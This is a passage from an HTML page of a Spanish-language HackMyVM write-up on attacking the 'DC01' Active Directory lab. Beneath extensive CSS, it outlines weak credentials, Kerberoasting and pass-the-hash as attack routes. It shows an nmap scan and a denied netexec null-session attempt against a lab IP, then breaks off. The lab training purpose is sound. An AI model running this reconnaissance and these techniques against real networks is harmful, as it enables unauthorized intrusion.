@@ -1,0 +1,1256 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DC01 v2 — HackMyVM Writeup | Yoandy Ramirez Delgado</title>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --ink:#0b1a10;--forest:#0f2318;--pine:#163020;--moss:#1e4030;--sage:#2a6048;
+  --green:#00e87a;--green2:rgba(0,232,122,.15);--green3:rgba(0,232,122,.06);
+  --cream:#f2ede4;--cream2:#faf7f1;
+  --text:#c8f0dc;--text2:rgba(200,240,220,.65);--text3:rgba(200,240,220,.35);
+  --card:#0d2215;--card2:#112b1c;--border:rgba(0,232,122,.1);
+  --red:#f87171;--yellow:#fbbf24;--blue:#60a5fa;--purple:#a78bfa;--orange:#fb923c;--cyan:#22d3ee;
+  --bb:'Bebas Neue',sans-serif;--dm:'DM Sans',sans-serif;--mo:'JetBrains Mono',monospace;
+  --accent:#00e87a;--bg:#0b1a10;--bg2:#0f2318;--bg3:#163020;
+  --text-muted:rgba(200,240,220,.35);--text-dim:rgba(200,240,220,.65);
+  --green4:#4ade80;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--ink);color:var(--text);font-family:var(--dm);line-height:1.7;font-size:15px;}
+a{color:var(--green);text-decoration:none;}
+code{background:var(--card2);padding:.15rem .4rem;border-radius:3px;font-family:var(--mo);font-size:.88em;color:var(--green);}
+pre{margin:0;white-space:pre-wrap;word-break:break-all;font-family:var(--mo);}
+ul{padding-left:1.5rem;}li{margin:.35rem 0;}
+h2{font-family:var(--bb);font-size:1.6rem;color:var(--text);border-bottom:1px solid var(--border);padding-bottom:.5rem;margin-bottom:1.25rem;letter-spacing:.04em;}
+h3{font-size:1.05rem;color:var(--text);margin-bottom:.75rem;font-weight:600;}
+
+/* ─── HERO ─── */
+.hero {
+  background: linear-gradient(135deg, var(--forest) 0%, var(--ink) 50%, #091a10 100%);
+  border-bottom: 1px solid var(--border);
+  padding: 60px 40px 50px;
+  position: relative;
+  overflow: hidden;
+}
+.hero::before {
+  content: '';
+  position: absolute; inset: 0;
+  background-image: linear-gradient(rgba(0,232,122,0.03) 1px, transparent 1px),
+                    linear-gradient(90deg, rgba(0,232,122,0.03) 1px, transparent 1px);
+  background-size: 56px 56px;
+  pointer-events: none;
+}
+.hero-layout {
+  max-width: 1200px; margin: 0 auto;
+  display: grid; grid-template-columns: 1fr 280px; gap: 48px; align-items: center;
+}
+@media(max-width: 900px) {
+  .hero-layout { grid-template-columns: 1fr; }
+  .hero-orb { order: -1; justify-self: center; }
+  .hero-meta { justify-content: center; }
+  .hero-sub { margin-left: auto; margin-right: auto; }
+  .hero-stats { justify-content: center; }
+}
+.hero-left { position: relative; z-index: 2; }
+.hero-brand {
+  font-family: var(--mo); font-size: 0.65rem;
+  color: rgba(0,232,122,0.45); letter-spacing: 0.2em; margin-bottom: 16px;
+  display: flex; align-items: center; gap: 8px;
+}
+.hero-brand-dot {
+  width: 6px; height: 6px; border-radius: 50%; background: var(--green);
+  box-shadow: 0 0 10px var(--green); animation: hpd 1.2s infinite alternate;
+}
+@keyframes hpd { to { opacity: 0.2; transform: scale(0.5); } }
+.hero h1 {
+  font-family: var(--bb); font-size: clamp(2.4rem, 4vw, 3.5rem);
+  font-weight: 400; letter-spacing: 0.04em; margin-bottom: 14px; line-height: 1;
+  color: var(--text);
+}
+.hero h1 span { color: var(--green); }
+.hero-sub {
+  color: var(--text2); font-size: 0.95rem; max-width: 600px;
+  margin-bottom: 24px; line-height: 1.7; font-weight: 300;
+}
+.hero-meta {
+  display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-bottom: 18px;
+}
+.tag {
+  display: inline-flex; align-items: center; gap: 5px;
+  padding: 4px 12px; border-radius: 4px;
+  font-family: var(--mo);
+  font-size: 10px; font-weight: 500; letter-spacing: 0.8px; text-transform: uppercase;
+}
+.tag-platform { background: rgba(0,232,122,0.1); color: var(--green); border: 1px solid rgba(0,232,122,0.25); }
+.tag-category { background: rgba(56,217,245,0.08); color: var(--cyan); border: 1px solid rgba(56,217,245,0.2); }
+.tag-diff { background: rgba(0,232,122,0.08); color: var(--green); border: 1px solid rgba(0,232,122,0.2); }
+.tag-diff-medium { background: rgba(245,166,35,0.08); color: #f5a623; border: 1px solid rgba(245,166,35,0.2); }
+.tag-diff-hard { background: rgba(248,113,113,0.08); color: var(--red); border: 1px solid rgba(248,113,113,0.2); }
+.tag-os { background: rgba(167,139,250,0.08); color: var(--purple); border: 1px solid rgba(167,139,250,0.2); }
+.tag-staff { background: rgba(245,166,35,0.08); color: #f5a623; border: 1px solid rgba(245,166,35,0.2); }
+.hero-stats {
+  display: flex; gap: 28px; flex-wrap: wrap;
+}
+.stat { display: flex; flex-direction: column; gap: 2px; }
+.stat-label {
+  font-family: var(--mo);
+  font-size: 9px; text-transform: uppercase; letter-spacing: 1.5px; color: var(--text3);
+}
+.stat-value { font-size: 1rem; font-weight: 700; color: var(--text); }
+.stat-value.green { color: var(--green); }
+
+/* Orb */
+.hero-orb { display: flex; align-items: center; justify-content: center; position: relative; }
+.orb-w { position: relative; width: 260px; height: 260px; }
+.orb-w .orb-el { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; }
+.orb-ring { position: absolute; border-radius: 50%; border: 1px solid; animation: ors linear infinite; }
+.orb-r1 { width: 260px; height: 260px; border-color: rgba(0,232,122,0.08); animation-duration: 30s; }
+.orb-r2 { width: 214px; height: 214px; border-color: rgba(0,232,122,0.12); animation-duration: 20s; animation-direction: reverse; border-style: dashed; }
+.orb-r3 { width: 172px; height: 172px; border-color: rgba(0,232,122,0.15); animation-duration: 15s; }
+@keyframes ors { to { transform: rotate(360deg); } }
+.orb-aura {
+  position: absolute; width: 200px; height: 200px; border-radius: 50%;
+  background: radial-gradient(circle, rgba(0,232,122,0.18) 0%, rgba(0,232,122,0.08) 35%, transparent 70%);
+  animation: oap 4s ease-in-out infinite;
+}
+@keyframes oap { 0%,100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } }
+.orb-core {
+  width: 130px; height: 130px; border-radius: 50%;
+  background: radial-gradient(circle at 38% 35%, rgba(0,232,122,0.35) 0%, rgba(15,48,32,0.8) 50%, rgba(11,26,16,0.95) 100%);
+  border: 1px solid rgba(0,232,122,0.3);
+  box-shadow: 0 0 60px rgba(0,232,122,0.2), 0 0 120px rgba(0,232,122,0.08), inset 0 0 40px rgba(0,232,122,0.1);
+  position: relative; z-index: 3; display: flex; align-items: center; justify-content: center; overflow: hidden;
+}
+.orb-core::before {
+  content: ''; position: absolute; top: 10%; left: 15%; width: 40%; height: 30%;
+  border-radius: 50%; background: rgba(255,255,255,0.12); filter: blur(8px);
+}
+.orb-rune {
+  font-family: var(--bb); font-size: 2.2rem; color: rgba(0,232,122,0.7);
+  text-shadow: 0 0 30px var(--green); position: relative; z-index: 2;
+  animation: org 3s ease-in-out infinite;
+}
+@keyframes org { 0%,100% { text-shadow: 0 0 20px var(--green), 0 0 40px rgba(0,232,122,0.4); } 50% { text-shadow: 0 0 40px var(--green), 0 0 80px rgba(0,232,122,0.6); } }
+.orb-scan {
+  position: absolute; left: 0; right: 0; height: 1.5px;
+  background: linear-gradient(90deg, transparent, rgba(0,232,122,0.5), transparent);
+  animation: osc 3s linear infinite; z-index: 4; pointer-events: none;
+}
+@keyframes osc { 0% { top: 5%; opacity: 0; } 10% { opacity: 0.8; } 90% { opacity: 0.5; } 100% { top: 95%; opacity: 0; } }
+.particle{position:absolute;width:3px;height:3px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green);animation:pf linear infinite}
+.p1{top:15%;left:25%;animation-duration:6s}.p2{top:25%;right:18%;animation-duration:8s;animation-delay:-2s;width:4px;height:4px}.p3{bottom:20%;left:30%;animation-duration:7s;animation-delay:-4s}.p4{bottom:30%;right:25%;animation-duration:9s;animation-delay:-1s;opacity:.6}
+@keyframes pf{0%{transform:translateY(0) scale(1);opacity:1}33%{transform:translateY(-12px) translateX(8px) scale(1.3);opacity:.7}66%{transform:translateY(-6px) translateX(-10px) scale(.8);opacity:.9}100%{transform:translateY(0) scale(1);opacity:1}}
+
+/* ─── LAYOUT ─── */
+.container{display:grid;grid-template-columns:1fr 300px;gap:2rem;max-width:1200px;margin:2rem auto;padding:0 1.5rem;}
+@media(max-width:900px){.container{grid-template-columns:1fr;}.code-compare,.lessons-grid{grid-template-columns:1fr;}}
+
+/* ─── SECTIONS ─── */
+.section{margin:2.5rem 0;}
+.step-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.step-number{font-size:.7rem;color:var(--green);font-weight:700;text-transform:uppercase;letter-spacing:3px;margin-bottom:.4rem;font-family:var(--mo);}
+.why-box{background:rgba(0,232,122,.05);border-left:3px solid rgba(0,232,122,.4);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.why-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.why-box p{font-size:.9rem;color:var(--text2);}
+.cmd-annotated{background:rgba(5,14,8,.9);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);margin:1rem 0;border:1px solid var(--border);}
+.cmd-line{font-size:1rem;line-height:2;}
+.cmd{color:var(--green);font-weight:700;}.flag-opt{color:var(--yellow);}.ip{color:var(--orange);}.param{color:var(--cyan);}
+.user-c{color:var(--purple);}.str-c{color:var(--green);}.comment-c{color:var(--text3);}
+.cmd-notes{margin-top:.75rem;padding-top:.75rem;border-top:1px solid var(--border);display:flex;flex-direction:column;gap:.3rem;}
+.cmd-note{font-size:.8rem;color:var(--text2);padding:.3rem .75rem;border-left:2px solid var(--border);}
+.output-box{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);font-size:.82rem;color:var(--text2);margin:1rem 0;overflow-x:auto;line-height:1.6;}
+.output-label{font-size:.65rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.interpret-box{background:rgba(0,232,122,.05);border-left:3px solid var(--green);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.interpret-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.interpret-box p,.interpret-box li{font-size:.88rem;color:var(--text2);}
+.decision-box{background:rgba(251,146,60,.05);border-left:3px solid var(--orange);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.decision-box strong{color:var(--orange);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.decision-box p{font-size:.88rem;color:var(--text2);}
+.info-box{background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:1.25rem;margin:1.25rem 0;}
+.info-box p{font-size:.9rem;color:var(--text2);}
+.vuln-card{background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.vuln-card h3{color:var(--red);margin-bottom:.75rem;}
+.agent-panel{display:grid;grid-template-columns:1fr 1fr 1fr;gap:1rem;margin:1.5rem 0;}
+@media(max-width:700px){.agent-panel{grid-template-columns:1fr;}}
+.agent-card{background:var(--card2);border-radius:10px;padding:1rem;border:1px solid var(--border);}
+.agent-card.rto{border-top:3px solid var(--orange);}
+.agent-card.bta{border-top:3px solid var(--cyan);}
+.agent-card.bhm{border-top:3px solid var(--purple);}
+.agent-label{font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.agent-card.rto .agent-label{color:var(--orange);}
+.agent-card.bta .agent-label{color:var(--cyan);}
+.agent-card.bhm .agent-label{color:var(--purple);}
+.agent-card p{font-size:.82rem;color:var(--text2);}
+.warning-card{background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-radius:8px;padding:1rem;display:flex;gap:1rem;align-items:flex-start;margin:1rem 0;}
+.warning-icon{font-size:1.5rem;flex-shrink:0;}
+.warning-card strong{color:var(--red);display:block;margin-bottom:.25rem;}
+.warning-card p{font-size:.85rem;color:var(--text2);}
+.worknotes-box{background:rgba(251,191,36,.04);border:1px solid rgba(251,191,36,.15);border-radius:10px;padding:1.25rem;margin:1rem 0;}
+.worknotes-box h4{color:var(--yellow);font-size:.85rem;margin-bottom:.75rem;}
+.data-table{width:100%;border-collapse:collapse;font-size:.85rem;margin:1rem 0;}
+.data-table th{background:var(--card2);color:var(--text3);padding:.6rem 1rem;text-align:left;font-size:.75rem;text-transform:uppercase;}
+.data-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+.data-table tr:last-child td{border-bottom:none;}
+.data-table .highlight{color:var(--green);font-weight:600;}
+.lessons-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1rem 0;}
+@media(max-width:700px){.lessons-grid{grid-template-columns:1fr;}}
+.lesson-card{background:var(--card2);border-radius:10px;padding:1.25rem;border:1px solid var(--border);}
+.lesson-card h4{font-size:.85rem;margin-bottom:.75rem;}
+.lesson-card.attacker h4{color:var(--orange);}
+.lesson-card.defender h4{color:var(--cyan);}
+.lesson-card li{font-size:.83rem;color:var(--text2);}
+.flag-box{background:linear-gradient(135deg,rgba(0,232,122,.06),rgba(0,232,122,.02));border:1px solid rgba(0,232,122,.25);border-radius:14px;padding:2rem;text-align:center;margin:2.5rem 0;}
+.flag-label{font-size:.75rem;color:var(--text3);text-transform:uppercase;letter-spacing:3px;margin-bottom:.75rem;font-family:var(--mo);}
+.flag-value{font-family:var(--mo);font-size:1.1rem;color:var(--green);background:rgba(0,232,122,.08);padding:.6rem 1.5rem;border-radius:8px;display:inline-block;border:1px solid rgba(0,232,122,.2);}
+
+/* ─── SIDEBAR ─── */
+.sidebar{position:sticky;top:2rem;height:fit-content;}
+.sidebar-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.25rem;margin-bottom:1rem;}
+.sidebar-card h4{margin:0 0 .9rem;font-size:.72rem;text-transform:uppercase;letter-spacing:2px;color:var(--text3);font-family:var(--mo);}
+.meta-row{display:flex;justify-content:space-between;align-items:center;font-size:.83rem;padding:.45rem 0;border-bottom:1px solid var(--border);}
+.meta-row:last-child{border-bottom:none;}
+.meta-label{color:var(--text3);}.meta-value{color:var(--text);font-weight:600;font-family:var(--mo);font-size:.8rem;}
+.mitre-tag{display:inline-block;background:rgba(167,139,250,.08);color:var(--purple);border:1px solid rgba(167,139,250,.2);border-radius:4px;padding:.2rem .5rem;font-size:.72rem;font-family:var(--mo);margin:.2rem .15rem;}
+.score-num{font-size:2.8rem;font-weight:900;color:var(--green);text-align:center;line-height:1;margin:.5rem 0;font-family:var(--bb);}
+.score-label{text-align:center;font-size:.75rem;color:var(--text3);}
+.glosario-item{padding:.5rem 0;border-bottom:1px solid var(--border);font-size:.8rem;}
+.glosario-item:last-child{border-bottom:none;}
+.glosario-term{color:var(--cyan);font-weight:600;font-family:var(--mo);display:block;margin-bottom:.15rem;}
+.glosario-def{color:var(--text3);line-height:1.4;}
+
+/* ─── EXTRA COMPONENT STYLES ─── */
+.nse-bonus{background:linear-gradient(135deg,rgba(251,191,36,.06),rgba(251,191,36,.02));border:1px solid rgba(251,191,36,.3);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.nse-bonus h3{color:var(--yellow);margin-bottom:.75rem;}
+.ftp-session{background:rgba(5,14,8,.9);border-radius:12px;padding:1.25rem;margin:1rem 0;font-family:var(--mo);font-size:.82rem;}
+.ftp-cmd{color:var(--cyan);}.ftp-resp{color:var(--text3);}.ftp-success{color:var(--green);}.ftp-flag{color:var(--yellow);font-weight:700;}
+.key-dump{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:12px;padding:1.25rem;margin:1.5rem 0;font-family:var(--mo);}
+.key-dump-header{font-size:.65rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:1rem;}
+.key-row{display:flex;align-items:center;gap:1rem;padding:.5rem .75rem;border-radius:6px;margin:.3rem 0;}
+.key-row.flag-key{background:rgba(0,232,122,.05);border:1px solid rgba(0,232,122,.15);}
+.key-name{color:var(--cyan);min-width:60px;font-weight:600;}
+.key-arrow{color:var(--border);}.key-value{color:var(--text2);flex:1;}
+.key-row.flag-key .key-value{color:var(--green);font-weight:600;}
+.key-badge{background:rgba(0,232,122,.15);color:var(--green);padding:.1rem .5rem;border-radius:4px;font-size:.7rem;font-weight:700;border:1px solid rgba(0,232,122,.3);}
+.rce-path{display:flex;flex-wrap:wrap;align-items:center;gap:.5rem;padding:1.25rem;background:rgba(248,113,113,.04);border:1px solid rgba(248,113,113,.15);border-radius:10px;margin:1rem 0;}
+.rce-step{background:var(--card2);padding:.35rem .75rem;border-radius:6px;font-family:var(--mo);font-size:.8rem;color:var(--text2);}
+.rce-arrow{color:var(--text3);font-size:1.2rem;}
+.rce-result{color:var(--red);border:1px solid rgba(248,113,113,.3);background:rgba(248,113,113,.08);}
+.redis-cmd-table{width:100%;border-collapse:collapse;font-size:.84rem;margin:1rem 0;font-family:var(--mo);}
+.redis-cmd-table th{background:var(--card2);color:var(--text3);padding:.6rem 1rem;text-align:left;font-size:.72rem;text-transform:uppercase;}
+.redis-cmd-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+.redis-cmd-table tr:last-child td{border-bottom:none;}
+.sqli-box{background:rgba(5,14,8,.9);border-radius:12px;padding:1.5rem;margin:1.5rem 0;border:1px solid var(--border);}
+.sqli-row{margin:.75rem 0;display:flex;align-items:flex-start;gap:1rem;}
+.sqli-label{color:var(--text3);font-size:.78rem;min-width:110px;font-family:var(--mo);padding-top:.2rem;flex-shrink:0;}
+.sqli-query{font-family:var(--mo);font-size:.88rem;line-height:1.8;flex:1;}
+.q-keyword{color:var(--blue);font-weight:700;}.q-string{color:var(--green);}.q-inject{color:var(--red);font-weight:900;font-size:1.1rem;}
+.q-comment{color:var(--text3);text-decoration:line-through;opacity:.55;}.q-result{color:var(--yellow);font-size:.8rem;margin-left:.5rem;}
+.sqli-divider{border:none;border-top:1px solid var(--border);margin:.75rem 0;}
+.code-compare{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1.5rem 0;}
+.vuln-code,.safe-code{border-radius:8px;padding:1rem;border:1px solid;}
+.vuln-code{background:rgba(248,113,113,.05);border-color:rgba(248,113,113,.3);}
+.safe-code{background:rgba(0,232,122,.05);border-color:rgba(0,232,122,.3);}
+.code-header{font-size:.82rem;font-weight:700;margin-bottom:.75rem;}
+.vuln-code .code-header{color:var(--red);}.safe-code .code-header{color:var(--green);}
+.code-box{background:rgba(5,14,8,.9);border-radius:6px;padding:.75rem;font-family:var(--mo);font-size:.78rem;color:var(--text2);margin:.5rem 0;}
+.code-note{font-size:.8rem;margin-top:.5rem;}
+.vuln-code .code-note{color:var(--red);}.safe-code .code-note{color:var(--green);}
+.curl-breakdown{background:rgba(5,14,8,.9);border-radius:12px;padding:1.5rem;border:1px solid var(--border);margin:1rem 0;}
+.curl-parts-top{display:flex;flex-wrap:wrap;gap:.75rem;margin-bottom:1rem;}
+.curl-part-item{display:flex;flex-direction:column;align-items:center;gap:.4rem;min-width:80px;}
+.curl-token{font-family:var(--mo);padding:.25rem .6rem;background:var(--card2);border-radius:4px;font-size:.82rem;white-space:nowrap;}
+.curl-token.cmd-t{color:var(--green);}.curl-token.flag-t{color:var(--yellow);}.curl-token.url-t{color:var(--orange);}
+.curl-explain-small{font-size:.72rem;color:var(--text3);text-align:center;max-width:100px;}
+.curl-payload{border-top:1px solid var(--border);padding-top:1rem;display:flex;gap:1rem;}
+.curl-payload-token{font-family:var(--mo);font-size:.82rem;color:var(--text2);background:var(--card2);padding:.4rem .75rem;border-radius:4px;flex-shrink:0;}
+.curl-payload-explain{font-size:.82rem;color:var(--text2);}
+.curl-payload-explain strong{color:var(--text);}
+.payloads-table{width:100%;border-collapse:collapse;font-size:.84rem;margin:1rem 0;}
+.payloads-table th{background:var(--card2);color:var(--text3);padding:.6rem 1rem;text-align:left;font-size:.72rem;text-transform:uppercase;}
+.payloads-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+.payloads-table tr:last-child td{border-bottom:none;}
+.payloads-table td code{color:var(--red);background:rgba(248,113,113,.1);padding:.1rem .3rem;border-radius:3px;}
+.highlight-row{background:rgba(0,232,122,.04);}
+.highlight-row td{border-left:3px solid var(--green);}
+.record-badge{background:rgba(251,191,36,.1);color:var(--yellow);border:1px solid rgba(251,191,36,.3);border-radius:6px;padding:.3rem .75rem;font-size:.75rem;text-align:center;margin-top:.5rem;}
+.owasp-badge{background:rgba(248,113,113,.1);color:var(--red);border:1px solid rgba(248,113,113,.3);border-radius:6px;padding:.4rem .75rem;font-size:.78rem;font-weight:600;text-align:center;margin:.5rem 0;}
+.smb-tree{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;padding:1.25rem;font-family:var(--mo);font-size:.85rem;color:var(--text2);margin:1rem 0;}
+
+</style>
+</head>
+<body>
+
+<!-- ═══ HERO ═══ -->
+<div class="hero">
+  <div class="hero-layout">
+    <div class="hero-left">
+      <div class="hero-brand"><span class="hero-brand-dot"></span>HEINDALL // WRITEUP</div>
+      <div class="hero-meta">
+        <span class="tag tag-platform">HackMyVM</span>
+        <span class="tag tag-category">AD</span>
+        <span class="tag tag-diff-medium">Medium</span>
+        <span class="tag tag-os">Windows</span>
+      </div>
+      <h1><span>DC01 v2</span> — AD Enumeration & Exploitation</h1>
+      <p class="hero-sub">Segunda aproximación al controlador de dominio DC01 con técnicas alternativas. Enumeración avanzada con BloodHound, explotación de relaciones ACL, y escalada de privilegios mediante técnicas de delegación Kerberos.</p>
+      <div class="hero-stats">
+        <div class="stat"><span class="stat-label">Target</span><span class="stat-value green">192.168.x.x</span></div>
+        <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Windows</span></div>
+        <div class="stat"><span class="stat-label">Puerto</span><span class="stat-value">88,389,445</span></div>
+        <div class="stat"><span class="stat-label">Tiempo</span><span class="stat-value">~35 min</span></div>
+        <div class="stat"><span class="stat-label">Vectores</span><span class="stat-value">4</span></div>
+      </div>
+    </div>
+    <!-- Orb — Right -->
+    <div class="hero-orb">
+      <div class="orb-w">
+        <div class="orb-el">
+          <div class="orb-ring orb-r1"></div>
+          <div class="orb-ring orb-r2"></div>
+          <div class="orb-ring orb-r3"></div>
+          <div class="orb-aura"></div>
+          <div class="orb-core"><span class="orb-rune">ᚺ</span></div>
+          <div class="orb-scan"></div>
+          <div class="particle p1"></div>
+          <div class="particle p2"></div>
+          <div class="particle p3"></div>
+          <div class="particle p4"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+<div class="grid">
+
+<!-- ═══ MAIN CONTENT ═══ -->
+<main>
+
+  <!-- ── 1. Descripción ── -->
+  <section class="section" id="s1">
+    <div class="section-header">
+      <div class="section-number">1</div>
+      <h2>Descripción del Objetivo</h2>
+    </div>
+
+    <div class="card">
+      <h3>Entorno Active Directory</h3>
+      <p style="font-size:0.9rem;color:var(--text-dim);margin-bottom:14px;line-height:1.7">
+        <strong style="color:#fff">DC01</strong> simula un controlador de dominio Windows Server 2022 con configuraciones inseguras típicas de entornos corporativos reales. El dominio <code style="color:var(--cyan)">SOUPEDECODE.LOCAL</code> cuenta con más de 1 000 cuentas de usuario, varias de las cuales presentan credenciales débiles (contraseña igual al nombre de usuario). Adicionalmente, múltiples cuentas de servicio tienen SPNs registrados y son vulnerables a Kerberoasting, mientras que el share de backup expone hashes NTLM de cuentas de máquina con privilegios de Domain Admin.
+      </p>
+      <table class="data-table">
+        <thead>
+          <tr>
+            <th>Puerto</th>
+            <th>Servicio</th>
+            <th>Versión / Banner</th>
+            <th>Estado</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td><code>53/tcp</code></td><td>DNS</td><td>Simple DNS Plus (SOUPEDECODE.LOCAL)</td><td><span class="badge badge-blue">Enumeración</span></td></tr>
+          <tr><td><code>88/tcp</code></td><td>Kerberos</td><td>Microsoft Windows Kerberos</td><td><span class="badge badge-red">Kerberoasting ✓</span></td></tr>
+          <tr><td><code>135/tcp</code></td><td>MSRPC</td><td>Microsoft Windows RPC</td><td><span class="badge badge-blue">Enumeración</span></td></tr>
+          <tr><td><code>139/tcp</code></td><td>NetBIOS-SSN</td><td>Windows netbios-ssn</td><td><span class="badge badge-blue">Enumeración</span></td></tr>
+          <tr><td><code>389/tcp</code></td><td>LDAP</td><td>Active Directory LDAP (DC=SOUPEDECODE,DC=LOCAL)</td><td><span class="badge badge-red">PTH ✓</span></td></tr>
+          <tr><td><code>445/tcp</code></td><td>SMB</td><td>Windows Server 2022 Build 20348 (SMBv2)</td><td><span class="badge badge-red">Comprometido ✓</span></td></tr>
+          <tr><td><code>464/tcp</code></td><td>Kpasswd5</td><td>Kerberos Password Change</td><td><span class="badge badge-blue">Info</span></td></tr>
+          <tr><td><code>593/tcp</code></td><td>RPC over HTTP</td><td>Microsoft DCOM RPC</td><td><span class="badge badge-blue">Info</span></td></tr>
+          <tr><td><code>636/tcp</code></td><td>LDAPS</td><td>Active Directory LDAP over SSL</td><td><span class="badge badge-blue">Info</span></td></tr>
+          <tr><td><code>3268/tcp</code></td><td>Global Catalog LDAP</td><td>Microsoft Windows Active Directory</td><td><span class="badge badge-blue">Enumeración</span></td></tr>
+          <tr><td><code>5985/tcp</code></td><td>WinRM</td><td>Microsoft HTTPAPI 2.0</td><td><span class="badge badge-red">evil-winrm ✓</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ── 2. Reconocimiento ── -->
+  <section class="section" id="s2">
+    <div class="section-header">
+      <div class="section-number">2</div>
+      <h2>Reconocimiento y Enumeración</h2>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">1</div>
+        <span class="step-title">Escaneo completo de puertos con nmap</span>
+      </div>
+      <div class="step-body">
+        <p>Se ejecuta un escaneo TCP completo con detección de versiones, scripts de servicio y fingerprinting de OS. El flag <code style="color:var(--cyan)">-p-</code> enumera los 65 535 puertos; <code style="color:var(--cyan)">-sSCV</code> combina SYN scan, detección de versión y scripts de categoría default.</p>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Kali — Reconocimiento Inicial</div>
+          <div class="code-body"><span class="cmd">nmap</span> <span class="param">-p- --open -sSCV -n -vvv -A -T5</span> <span class="ip">10.0.2.9</span> <span class="param">-oN dc01_scan.txt</span></div>
+        </div>
+        <div class="callout callout-info" style="margin-top:10px">
+          <strong>Resultado:</strong> 15 puertos abiertos. El sistema responde como <strong>Windows Server 2022 Build 20348</strong> con dominio <strong>SOUPEDECODE.LOCAL</strong>. Confirmación de DC por la presencia simultánea de Kerberos (88), LDAP (389, 3268), DNS (53) y SMB (445).
+        </div>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Output Relevante — nmap</div>
+          <div class="code-body"><span class="output">PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+9389/tcp open  mc-nmf        .NET Message Framing
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:</span>
+<span class="green">|     Message signing enabled and required</span>
+<span class="output">| smb-os-discovery:
+|   OS: Windows Server 2022 Build 20348
+|   Computer name: DC01
+|   NetBIOS computer name: DC01</span>
+<span class="highlight">|   Domain: SOUPEDECODE.LOCAL</span>
+<span class="output">|   FQDN: DC01.SOUPEDECODE.LOCAL
+
+OS: Windows Server 2022 (Windows Server 2022 6.2)</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">2</div>
+        <span class="step-title">Enumeración SMB anónima</span>
+      </div>
+      <div class="step-body">
+        <p>Se intenta conectar al SMB sin credenciales para listar shares accesibles. La sesión nula (anonymous/guest) es el primer punto de entrada en muchos entornos AD mal configurados.</p>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Kali — SMB null session</div>
+          <div class="code-body"><span class="cmd">netexec</span> <span class="param">smb</span> <span class="ip">10.0.2.9</span> <span class="param">-u '' -p '' --shares</span></div>
+        </div>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Output</div>
+          <div class="code-body"><span class="output">SMB         10.0.2.9   445  DC01  [*] Windows Server 2022 Build 20348 x64
+SMB         10.0.2.9   445  DC01  [-] SOUPEDECODE.LOCAL\: STATUS_ACCESS_DENIED</span></div>
+        </div>
+        <div class="callout callout-warn">
+          <strong>Resultado:</strong> Sesión nula denegada. El DC rechaza conexiones sin credenciales válidas. Se procede con RID brute-force, que sólo requiere una sesión SMB válida pero no necesita ser autenticada en algunos entornos.
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
